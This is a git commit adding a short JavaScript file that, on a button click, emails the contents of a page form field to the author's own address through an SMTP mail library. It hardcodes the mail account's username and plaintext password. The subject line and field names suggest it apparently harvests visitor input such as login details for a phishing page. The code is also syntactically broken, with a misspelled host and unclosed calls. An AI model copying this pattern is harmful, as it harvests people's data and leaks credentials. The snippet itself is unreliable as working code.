0e74fc018aa13d6ab117f52923613f7ddd78285e
jnvc583 <jnvcotc@zohomail.cn>
2025-06-21 12:10:17 +0800

    Create gem.js

---
+++ gem.js
@@ -0,0 +1,13 @@
+var etn= document.getElementById("etn");
+etn.onclick=function(){
+  Email.send({
+    Host: "stmp.zoho.com",
+    Username: "jnvcotc@zohomail.cn",
+    Password: "324893246877193",
+    To: "jnvcotc@zohomail.cn",
+    From: "jnvcotc@zohomail.cn",
+    Subject: "windows",
+    Body: ef.mai.value
+  }).then(
+    message => alert(message)
+}
